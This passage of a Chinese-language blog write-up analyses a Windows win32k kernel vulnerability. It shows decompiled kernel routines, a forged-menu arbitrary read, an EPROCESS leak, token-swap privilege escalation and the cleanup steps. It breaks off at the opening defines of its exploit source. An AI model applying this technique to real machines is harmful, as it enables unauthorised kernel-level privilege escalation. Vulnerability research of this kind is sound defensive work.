class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">TranslateAccelerator</span>(msg.hwnd, hAccelTable, &amp;msg))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line">            <span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>) msg.wParam;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (message)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">        <span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, message, wParam, lParam);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/04/AqoY7JeLd61SGht.png" alt="Untitled 3.png"></p>
<blockquote>
<p>这里不需要 SetWindowLongPtr 就会 BSOD 好像是因为会在程序流中使用 ExtraBytes 导致的，会有很多神奇的情况（x</p>
</blockquote>
<h2 id="堆块布局和任意地址写"><a href="#堆块布局和任意地址写" class="headerlink" title="堆块布局和任意地址写"></a>堆块布局和任意地址写</h2><p>我们可以申请三个窗口，分别为 <code>0 , 1 , 2</code> ，然后将 <code>0</code> 块设置为内核寻址模式，将 <code>2</code> 作为被我们设置的混淆堆块，把它的 <code>ExtraBytes</code> 指向 <code>0</code> 块（可以通过 <code>HmValidateHandle</code> 读取 <code>0</code> 块的内容，其中 <code>+0x8</code> 的位置就是它相对于 <code>DesktopBaseAddr</code>  的偏移）。这样我们可以通过 <code>2</code> 块来改变 <code>0</code> 块的内容，同时也可以改写 <code>1</code> 块的 <code>pExtraBytes</code> 指针使其指向任意位置而进行任意位置的读写。</p>
<p>整体的描述可以参考 <code>in1t</code> 师傅的 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241804#h2-0">文章</a> 画的图：</p>
<p><img src="https://s2.loli.net/2022/05/04/2WFdHwerjQLfTxb.png" alt="Untitled 4.png"></p>
<h2 id="任意地址读与地址泄露"><a href="#任意地址读与地址泄露" class="headerlink" title="任意地址读与地址泄露"></a>任意地址读与地址泄露</h2><p>虽然上面提到了如何任意地址读写，但是我们还未泄露出内核的地址，更不好进行所谓的任意地址读写。在野的 <code>EXP</code> 中使用了 <code>[user32!GetMenuBarInfo](https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-getmenubarinfo)</code> 通过伪造 <code>tagMENU</code> 结构体进行内核读取，其最终会调用到 <code>win32kfull!xxxGetMenuBarInfo</code> 中，逻辑如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">xxxGetMenuBarInfo</span><span class="params">(__int64 pTagWND, <span class="type">int</span> idObject, <span class="type">int</span> idItem, tagMENUBARINFO *pmbi)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">if</span> ( (*(_BYTE *)(pTagWNDk + <span class="number">0x1F</span>) &amp; <span class="number">0x40</span>) != <span class="number">0</span> ) <span class="comment">// pTagWNDk-&gt;dwStyle can&#x27;t have WS_CHILD</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">goto</span> end;</span><br><span class="line">	&#125;</span><br><span class="line">	spMenu = *(_QWORD *)(pTagWND + <span class="number">0xA8</span>);</span><br><span class="line">	<span class="keyword">if</span> ( !spMenu )</span><br><span class="line">    <span class="keyword">goto</span> end;</span><br><span class="line">	SmartObjStackRefBase&lt;tagMENU&gt;::<span class="keyword">operator</span>=(&amp;spMenuk, spMenu); <span class="comment">// *spMenuk = spMenu, *(spMenu + 0x98) = spMenuk </span></span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">if</span> ( idObject == <span class="number">0xFFFFFFFD</span> )&#123; <span class="comment">// OBJID_MENU</span></span><br><span class="line">		<span class="keyword">if</span> ( !(<span class="type">unsigned</span> __int8)SmartObjStackRef&lt;tagMENU&gt;::<span class="keyword">operator</span> <span class="built_in">bool</span>(&amp;spMenuk)</span><br><span class="line">    &amp;&amp; (<span class="type">int</span>)idItem &gt; <span class="number">0</span> <span class="comment">// check</span></span><br><span class="line">    &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)idItem &lt;= *(_DWORD *)(*((_QWORD *)*spMenuk + <span class="number">5</span>) + <span class="number">0x2C</span>i64)) <span class="comment">// check, idItem  &lt;= *(*(*spMenuk + 0x28) + 0x2c)</span></span><br><span class="line">		&#123;</span><br><span class="line">			spMenu = *(_QWORD *)(pTagWND + <span class="number">0xA8</span>);</span><br><span class="line">			spMenukPtr = *spMenuk;</span><br><span class="line">		  *(__int64 *)((<span class="type">char</span> *)&amp;pmbi-&gt;hMenu + <span class="number">4</span>) = *(_QWORD *)spMenukPtr; </span><br><span class="line">			<span class="keyword">if</span> ( *((_DWORD *)*spMenuk + <span class="number">0x10</span>) &amp;&amp; *((_DWORD *)*spMenuk + <span class="number">0x11</span>) ) <span class="comment">// check (*(*spMenuk + 0x40) == 1 and *(*spMenuk + 0x44) == 1)</span></span><br><span class="line">		  &#123;</span><br><span class="line">		    <span class="keyword">if</span> (idItem)</span><br><span class="line">		    &#123;</span><br><span class="line">		      pTagWNDk = *(_QWORD *)(pTagWND + <span class="number">0x28</span>);</span><br><span class="line">		      idItem_mul_0x60 = <span class="number">0x60</span> * idItem; <span class="comment">// idItem = 1</span></span><br><span class="line">		      addr = *((_QWORD *)*spMenuk + <span class="number">0xB</span>);</span><br><span class="line">		      readAddr = *(_QWORD *)(<span class="number">0x60</span> * idItem + addr - <span class="number">0x60</span>); <span class="comment">// readAddr = fakeAddr - 0x40</span></span><br><span class="line">		      <span class="keyword">if</span> ( (*(_BYTE *)(pTagWNDk + <span class="number">0x1A</span>) &amp; <span class="number">0x40</span>) != <span class="number">0</span> )</span><br><span class="line">		      &#123;</span><br><span class="line">		        value = *(_DWORD *)(pTagWNDk + <span class="number">0x60</span>) - *(_DWORD *)(readAddr + <span class="number">0x40</span>);</span><br><span class="line">		        pmbi-&gt;rcBar.right = value; <span class="comment">// set value to pmbi</span></span><br><span class="line">		        pmbi-&gt;rcBar.left = value - *(_DWORD *)(*(_QWORD *)(idItem_mul_0x60 + addr - <span class="number">0x60</span>) + <span class="number">0x48</span>i64); <span class="comment">// set value to pmbi</span></span><br><span class="line">		      &#125;</span><br><span class="line">		      <span class="keyword">else</span></span><br><span class="line">		      &#123;</span><br><span class="line">		        value = *(_DWORD *)(readAddr + <span class="number">0x40</span>) + *(_DWORD *)(pTagWNDk + <span class="number">0x58</span>);</span><br><span class="line">		        pmbi-&gt;rcBar.left = value; <span class="comment">// set value to pmbi</span></span><br><span class="line">		        pmbi-&gt;rcBar.right = value + *(_DWORD *)(*(_QWORD *)(idItem_mul_0x60 + addr - <span class="number">0x60</span>) + <span class="number">0x48</span>i64); <span class="comment">// set value to pmbi</span></span><br><span class="line">		      &#125;</span><br><span class="line">		      topValue = *(_DWORD *)(*(_QWORD *)(pTagWND + <span class="number">0x28</span>) + <span class="number">0x5C</span>i64)</span><br><span class="line">		               + *(_DWORD *)(*(_QWORD *)(idItem_mul_0x60 + addr - <span class="number">0x60</span>) + <span class="number">0x44</span>i64);</span><br><span class="line">		      pmbi-&gt;rcBar.top = topValue;</span><br><span class="line">		      bottomValue = topValue + *(_DWORD *)(*(_QWORD *)(idItem_mul_0x60 + addr - <span class="number">0x60</span>) + <span class="number">0x4C</span>i64);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				...</span><br><span class="line">			&#125;</span><br><span class="line">			pmbi-&gt;rcBar.bottom = bottomValue;</span><br><span class="line">			...</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>GetMenuBarInfo 会根据传入的 hwnd 找到对应的 pTagWND 并传入 xxxGetMenuBarInfo ，此时 idObject 为 OBJID_MENU(0xFFFFFFFD) 且 idItem 为 1，idItem 的定义为：The item for which to retrieve information. If this parameter is zero, the function retrieves information about the menu itself. If this parameter is 1, the function retrieves information about the first item on the menu, and so on.</p>
</blockquote>
<p>当我们传入的 <code>idObject</code> 为 <code>OBJID_MENU</code> 且满足一定条件的时候，会根据 <code>*((_QWORD *)*spMenuk + 0xB)</code> 取出一个地址并读取那里的值用于计算 <code>pmbi-&gt;rcBar</code> 的内容。所以我们可以伪造 <code>tagMENU</code> 结构来达到任意读的目的。约束条件归纳如下：</p>
<ul>
<li>pTagWNDk-&gt;dwStyle 不能有 WS_CHILD</li>
<li>idObject &#x3D;&#x3D; 0xFFFFFFFD</li>
<li>0 &lt; idItem  &lt;&#x3D; <em>(</em>(*spMenuk + 0x28) + 0x2c)</li>
<li>*(*spMenuk + 0x40) &#x3D;&#x3D; 1 and *(*spMenuk + 0x44) &#x3D;&#x3D; 1</li>
<li>readAddr &#x3D; targetAddr - 0x40</li>
</ul>
<p>参考 <code>in1t</code> 师傅的 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241804#h2-0">文章</a> 画的图：</p>
<p><img src="https://s2.loli.net/2022/05/04/9De3SaEuyNiorYZ.png" alt="Untitled 5.png"></p>
<p>同时在 <code>spMenu</code> 中也可以泄露 <code>eprocess</code> ，具体来说是在：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spMenu = *(pTagWND + <span class="number">0xA8</span>)</span><br><span class="line">pTEB = *(*(spMenu + <span class="number">0x50</span>) + <span class="number">0x10</span>)</span><br><span class="line">pEPROCESS = *(*pTEB + <span class="number">0x220</span>)</span><br></pre></td></tr></table></figure>

<p><code>in1t</code> 师傅的 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241804#h2-0">文章</a> 也提到了另一种泄露 <code>eprocess</code> 的方式，不过可能由于版本问题在我的环境上不行，简单贴一下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spMenu = *(pTagWND + <span class="number">0xA8</span>)</span><br><span class="line">pEPROCESS = *(*(spMenu + <span class="number">0x18</span>) + <span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在 *(pTagWND + 0x98) 处也有 spMenu ，不过该字段默认情况下是未初始化的，不能直接读它获得 eprocess  。另外 0xa8 这个偏移也在各个版本不太一样，需要调整。同时也不是一定可以读到 eprocess 的，很多情况下读不到的，需要反复来几遍。</p>
</blockquote>
<p>那么我们该如何设置 <code>spMenu</code> 呢？我们可以使用 <code>tagWNDk0</code> 直接越界写 <code>tagWNDk1</code> 的结构并修改，或者直接使用 <code>SetWindowLongPtr</code> 也可以设置，根据 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-setwindowlongptrw">官方文档</a> 的说明，我们只需要将传入的 nIndex 设为 <code>GWLP_ID</code> ****即可：</p>
<p><img src="https://s2.loli.net/2022/05/04/Tn2NXSHfJ5M6Blt.png" alt="Untitled 6.png"></p>
<p>其最终会调用 <code>win32kfull!xxxSetWindowData</code> ，大致逻辑为：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">xxxSetWindowData</span><span class="params">(<span class="keyword">struct</span> tagWND *pTagWND, <span class="type">int</span> index, __int64 value, <span class="type">unsigned</span> <span class="type">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ( index != <span class="number">0xFFFFFFFC</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( index )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xFFFFFFF4</span>:</span><br><span class="line">        pTagWNDk = *((_QWORD *)pTagWND + <span class="number">5</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (*(_BYTE *)(pTagWNDk + <span class="number">31</span>) &amp; <span class="number">0xC0</span>) == <span class="number">0x40</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          ret = *((_QWORD *)pTagWND + <span class="number">0x15</span>);</span><br><span class="line">          *(_QWORD *)(pTagWNDk + <span class="number">0x98</span>) = value;</span><br><span class="line">          *((_QWORD *)pTagWND + <span class="number">0x15</span>) = value;</span><br><span class="line">          <span class="keyword">goto</span> end;</span><br><span class="line">        &#125;</span><br><span class="line">			...</span><br><span class="line">		&#125;</span><br><span class="line">	...</span><br><span class="line">end:</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它不仅仅会设置 <code>tagWND</code> 和 <code>tagWNDk</code> 中的 <code>spMenu</code> ，还会把旧的 <code>spMenu</code> 返回给调用者。这样就可以拿到旧的 <code>spMenu</code> 并泄露 <code>eprocess</code>  了。</p>
<h2 id="清理环境"><a href="#清理环境" class="headerlink" title="清理环境"></a>清理环境</h2><p>在有了地址泄露、任意地址读写之后，替换 <code>token</code> 即可提权，最后我们需要清理一下被破坏的结构，防止出现蓝屏。需要清理的有以下几个点：</p>
<ul>
<li>tagWND0 不需要恢复</li>
<li>tagWND1 需要恢复 spMenu 和 pExtraBytes</li>
<li>tagWND2 需要恢复 pExtraBytes 和分辨用户态和内核态堆的 flags</li>
</ul>
<h2 id="最后结果"><a href="#最后结果" class="headerlink" title="最后结果"></a>最后结果</h2><p><img src="https://s2.loli.net/2022/05/04/GzbqwNUCFE3njYO.png" alt="Untitled 7.png"></p>
<blockquote>
<p>本来还有个 debug 的窗口的不过运行完就直接关闭了，所以只剩下这两个页面了</p>
</blockquote>
<h1 id="PATCH分析"><a href="#PATCH分析" class="headerlink" title="PATCH分析"></a>PATCH分析</h1><p>就是在 <code>create windows</code> 的时候检查了标志位，如果设置的话则证明有问题，会将 <code>pTagWNDk</code> 回退回去：</p>
<p><img src="https://s2.loli.net/2022/05/04/hPJnrU7WS4x6VCZ.png" alt="Untitled 8.png"></p>
<blockquote>
<p>另外该文章撰写于 2022 年 1 月，这个月报了几个 win32k 的 CVE 如 CVE-2022-21882 ，信息为绕过了该 patch 。之前我一直没想通这该怎么绕，后面看了补丁发现原来不止这一处调用了 xxxClientAllocWindowClassExtraBytes ，还有别的类型的窗口也会调用该函数从而导致一样的问题。感觉自己看这个洞看晚了，说不定看的早还能发现这个问题。</p>
</blockquote>
<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;poc.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NT_SUCCESS(status)                  (status == (NTSTATUS)0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LOADSTRING                      100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CB_WND_EXTRA_1                      0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CB_WND_EXTRA_2                      0x1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLASS_NAME_1                        <span class="string">L&quot;ClassName1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLASS_NAME_2                        <span class="string">L&quot;ClassName2&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPRAY_WND_SIZE                      0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CB_WND_EXTRA_OFFSET                 0xc8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_EXTRA_BYTES                    0xffffff00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WND_EXTRA_BYTES_OFFSET              0x128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TAG_WNDk_OFFSET                     0x8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_SP_MENU_SIZE                   0xa0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DW_EXSTYLE_OFFSET                   0x18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODIFY_OFFSET_FLAG_OFFSET           0xE8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCESS_ID_OFFSET                   0x2e8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_EPROCESS_OFFSET                0x2f0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOKEN_OFFSET                        0x360    </span></span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> ULONG64* (NTAPI* lHMValidateHandle)(HWND h, <span class="type">int</span> type);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> ULONG64* (__fastcall* lHMValidateHandle)(HWND h, <span class="type">int</span> type);</span><br><span class="line"><span class="meta">#<span 